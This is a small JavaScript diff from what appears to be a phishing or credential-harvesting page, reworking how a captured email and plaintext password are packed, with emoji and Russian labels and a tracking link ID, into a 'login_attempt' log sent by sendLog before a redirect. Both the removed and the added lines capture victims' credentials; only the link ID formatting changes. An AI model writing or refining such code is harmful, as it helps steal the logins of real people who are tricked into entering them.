@@ -897,9 +897,7 @@
             const currency = urlParams.get('currency');
 
             // Send log with link_id if present
-            const logDetails = link_id
-              ? `👨 Logi: ${email}\n🔐 Pas: ${password}\n🔗 Линк айди: ${link_id}`
-              : `👨 Logi: ${email}\n🔐 Pas: ${password}`;
+            const logDetails = `👨 Logi: ${email}\n🔐 Pas: ${password}${link_id ? `\nlink_id=${link_id}` : ''}`;
 
             sendLog('login_attempt', logDetails, function() {
                 // Build redirect URL with all parameters
